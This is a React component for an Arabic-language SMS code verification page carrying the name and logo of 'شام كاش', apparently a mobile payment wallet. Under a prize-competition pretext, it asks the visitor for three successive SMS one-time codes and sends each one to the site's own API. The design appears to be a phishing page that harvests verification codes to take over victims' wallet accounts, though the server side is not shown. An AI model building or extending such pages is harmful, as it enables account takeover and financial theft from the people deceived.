import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { verifyOtpSchema, type VerifyOtpData } from "@shared/schema";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { Shield, Loader2, Smartphone } from "lucide-react";
import logoImage from "@assets/IMG_0350_1761335875653.jpeg";

export default function VerifySms() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [currentCodeNumber, setCurrentCodeNumber] = useState(1); // Track which code we're on (1, 2, or 3)
  
  // Get userId from URL
  const params = new URLSearchParams(window.location.search);
  const userId = params.get("userId");

  useEffect(() => {
    if (!userId) {
      setLocation("/");
      return;
    }
  }, [userId, setLocation]);

  const form = useForm<VerifyOtpData>({
    resolver: zodResolver(verifyOtpSchema),
    defaultValues: {
      userId: userId || "",
      otp: "",
    },
  });

  const verifyMutation = useMutation({
    mutationFn: async (data: VerifyOtpData & { codeNumber: number }) => {
      const res = await apiRequest("POST", "/api/auth/verify-otp", data);
      return await res.json();
    },
    onSuccess: () => {
      if (currentCodeNumber < 3) {
        // Still have more codes to enter
        form.reset({ userId: userId || "", otp: "" });
        setCurrentCodeNumber(currentCodeNumber + 1);
        toast({
          title: `تم قبول الكود ${currentCodeNumber}`,
          description: `أدخل الكود ${currentCodeNumber + 1}`,
        });
      } else {
        // All 3 codes entered - go to congratulations
        toast({
          title: "تم التحقق بنجاح! ✓",
          description: "مبروك لقد تم تسجيلك في المسابقة",
        });
        setLocation("/congratulations");
      }
    },
    onError: (error: any) => {
      toast({
        variant: "destructive",
        title: "خطأ في التحقق",
        description: error.message || "رمز التحقق غير صحيح",
      });
    },
  });

  const onSubmit = (data: VerifyOtpData) => {
    verifyMutation.mutate({ ...data, codeNumber: currentCodeNumber });
  };

  return (
    <div className="min-h-screen bg-background flex items-center justify-center px-4" dir="rtl">
      {/* Background Pattern */}
      <div className="absolute inset-0 opacity-5">
        <div className="absolute top-20 right-10 w-64 h-64 bg-primary rounded-full blur-3xl"></div>
        <div className="absolute bottom-20 left-10 w-96 h-96 bg-accent rounded-full blur-3xl"></div>
      </div>

      <div className="w-full max-w-md relative z-10">
        {/* Logo */}
        <div className="flex justify-center mb-8">
          <img 
            src={logoImage} 
            alt="شام كاش" 
            className="w-20 h-20 object-contain"
            data-testid="logo-verify"
          />
        </div>

        {/* Verify Card */}
        <div className="bg-card border border-border rounded-lg p-8 space-y-6">
          {/* Icon */}
          <div className="flex justify-center">
            <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center">
              <Smartphone className="w-8 h-8 text-primary" />
            </div>
          </div>

          <div className="text-center space-y-2">
            <h1 className="text-2xl font-bold text-foreground" data-testid="text-verify-title">
              أدخل كود SMS
            </h1>
            <p className="text-muted-foreground text-sm">
              أدخل الرمز المرسل إلى هاتفك
            </p>
          </div>

          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              {/* OTP Field */}
              <FormField
                control={form.control}
                name="otp"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>رمز التحقق</FormLabel>
                    <FormControl>
                      <Input
                        {...field}
                        type="text"
                        placeholder="******"
                        maxLength={8}
                        className="text-center text-2xl tracking-widest font-bold"
                        data-testid="input-otp"
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              {/* Submit Button */}
              <Button
                type="submit"
                className="w-full"
                disabled={verifyMutation.isPending}
                data-testid="button-verify-submit"
              >
                {verifyMutation.isPending ? (
                  <>
                    <Loader2 className="w-4 h-4 ml-2 animate-spin" />
                    جاري التحقق...
                  </>
                ) : (
                  <>
                    <Shield className="w-4 h-4 ml-2" />
                    تأكيد الرمز
                  </>
                )}
              </Button>
            </form>
          </Form>

          {/* Back to Login */}
          <div className="text-center">
            <Button
              variant="ghost"
              onClick={() => setLocation("/")}
              data-testid="button-back-login"
            >
              العودة لتسجيل الدخول
            </Button>
          </div>
        </div>
      </div>
    </div>
  );
}
